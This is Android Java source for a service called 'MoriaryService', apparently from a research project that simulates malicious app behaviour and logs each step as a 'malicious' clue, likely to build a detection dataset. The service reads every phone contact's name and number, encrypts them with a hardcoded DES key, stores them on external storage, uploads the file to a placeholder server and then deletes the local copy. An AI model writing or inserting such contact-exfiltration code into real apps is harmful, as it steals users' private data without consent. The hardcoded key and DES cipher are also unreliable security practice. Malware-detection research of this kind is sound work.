package com.bgu.sherlock.Moriarty.moriartyUtils;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Environment;
import android.provider.ContactsContract;
import android.util.Base64;
import android.util.Log;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.HttpVersion;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.params.ConnManagerPNames;
import org.apache.http.conn.params.ConnPerRouteBean;
import org.apache.http.entity.FileEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpParams;
import org.apache.http.params.HttpProtocolParams;
import org.json.JSONException;
import org.json.JSONObject;

import javax.crypto.*;
import javax.crypto.spec.DESKeySpec;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;

public class MoriaryService extends IntentService {
    public MoriaryService() {
        super("MoriaryService");
    }

    Clues clue = new Clues();
    File dataFile;
    File clueFile;
    File StorageDir;
    Long startTime;
    private static String cryptoPass = "SherlokSimon";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startTime = System.currentTimeMillis();
        clue.SendLog("Moriarty start", "Moriarty service started!" ,"malicious");
        StorageDir = getDir();
        clueFile = new File(StorageDir, "MoriartyClues.txt");
        return super.onStartCommand(intent, flags, startId);
    }


    @Override
    protected void onHandleIntent(Intent intent) {
        dataFile = new File(StorageDir, "Contacts.txt");
        FileWriter writer = null;
        JSONObject contacts = new JSONObject();
        clue.SendLog("Contacts", "Begin: reading and encrypting contacts","malicious");
        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        int count = phones.getCount();
        while (phones.moveToNext()) {

            String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            Log.i("name", name);
            Log.i("phone", phoneNumber);
            name = encryptIt(name);
            phoneNumber = encryptIt(phoneNumber);
            try {
                contacts.put("name", name);
                contacts.put("phone", phoneNumber);
            } catch (JSONException e) {
                e.printStackTrace();
            }
            try {
                writer = new FileWriter(dataFile, true);
                writer.write(contacts.toString());
                writer.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        phones.close();
        clue.SendLog("Contacts", "End: encrypted contacts written to tmp file(#Contacts,Size in bytes);" +count + ";" + (dataFile.length()) ,"malicious");

        sendToServer(intent);
        Log.d(MoriaryService.class.toString(), "sent data");
    }

    public static String encryptIt(String value) {
        try {
            DESKeySpec keySpec = new DESKeySpec(cryptoPass.getBytes("UTF8"));
            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("DES");
            SecretKey key = keyFactory.generateSecret(keySpec);

            byte[] clearText = value.getBytes("UTF8");
            // Cipher is not thread safe
            Cipher cipher = Cipher.getInstance("DES");
            cipher.init(Cipher.ENCRYPT_MODE, key);

            String encrypedValue = Base64.encodeToString(cipher.doFinal(clearText), Base64.DEFAULT);
            Log.i(MoriaryService.class.toString(), "Encrypted: " + value + " -> " + encrypedValue);
            return encrypedValue;

        } catch (InvalidKeyException e) {
            e.printStackTrace();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (InvalidKeySpecException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (BadPaddingException e) {
            e.printStackTrace();
        } catch (NoSuchPaddingException e) {
            e.printStackTrace();
        } catch (IllegalBlockSizeException e) {
            e.printStackTrace();
        }
        return value;
    }

    @Override
    public void onDestroy() {
long diff = System.currentTimeMillis() - startTime;
        clue.SendLog("Moriarty end", "Moriarty is closing the intent service (total duration [msec]);" + diff, "malicious");

        super.onDestroy();
    }

    public static File getDir() {
        File sdCard = Environment.getExternalStorageDirectory();
        File file = new File(sdCard.getAbsolutePath() + "/" + "Moriarty");
        file.mkdirs();
        return file;
    }

    private void sendToServer(Intent intent) {
clue.SendLog("Send to server", "Begin: Sending contacts to server", "malicious");
        Long sendTime = System.currentTimeMillis();
        ConnectivityManager connManager = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
        String info = connManager.getActiveNetworkInfo().getTypeName();
        HttpParams params;
        params = new BasicHttpParams();
        params.setParameter(ConnManagerPNames.MAX_TOTAL_CONNECTIONS, 1);
        params.setParameter(ConnManagerPNames.MAX_CONNECTIONS_PER_ROUTE, new ConnPerRouteBean(1));
        params.setParameter(HttpProtocolParams.USE_EXPECT_CONTINUE, false);
        HttpProtocolParams.setVersion(params, HttpVersion.HTTP_1_1);
        HttpProtocolParams.setContentCharset(params, "utf8");
        DefaultHttpClient client = new HttpClient(params);
        HttpClient.setContext(getApplicationContext());
        HttpResponse getResponse = null;
        try {
            HttpPost postRequest = new HttpPost("https://ServerURL:443/archiveArtifact/rest/test");
            HttpEntity entity = new FileEntity(dataFile, "application/txt");
//            postRequest.setHeader(HttpHeaders.CONTENT_TYPE, "application/txt");
            postRequest.setEntity(entity);
            clue.SendLog("Send to server", "Sending contacts to server(wifi/mobile);"+info,"malicious");
            getResponse = client.execute(postRequest);

            if (getResponse.getStatusLine().getStatusCode() == 200) {
                clue.SendLog("Send to server", "Successful send to server(duration [msec],size [bytes]);"+(System.currentTimeMillis()-sendTime) +";"+ dataFile.length(),"malicious");
                dataFile.delete();
                clue.SendLog("Contacts", "Deleted the contacts file","malicious");
                Log.e(MoriaryService.class.toString(), "Response: 200 " + getResponse.toString());
                return;
            } else {
                //setAlarm(getApplicationContext(),"Error", wifiTries);
                clue.SendLog("Send to server", "Error occurred response: " + getResponse.getStatusLine().toString() ,"malicious");
                Log.e(MoriaryService.class.toString(), "Response: " + getResponse.getStatusLine().toString());
//                Intent itnt = new Intent(getApplicationContext(), MoriaryService.class);
//                AlarmManager alarmManager = (AlarmManager) getApplicationContext().getSystemService(getApplicationContext().ALARM_SERVICE);
//                PendingIntent alarmIntent = PendingIntent.getBroadcast(getApplicationContext(), 1, itnt, PendingIntent.FLAG_UPDATE_CURRENT);
//                alarmManager.setExact(AlarmManager.RTC_WAKEUP,
//                        System.currentTimeMillis() +
//                                1000 * 10, alarmIntent);
                Log.e(MoriaryService.class.toString(), "starting again");
                return;
            }
        } catch (Exception ex) {
            ex.printStackTrace();
            clue.SendLog("Error", "Error: " + ex.toString() ,"malicious");
            Log.e(MoriaryService.class.toString(), "Error: " + ex.toString());
            return;
        }
    }

}
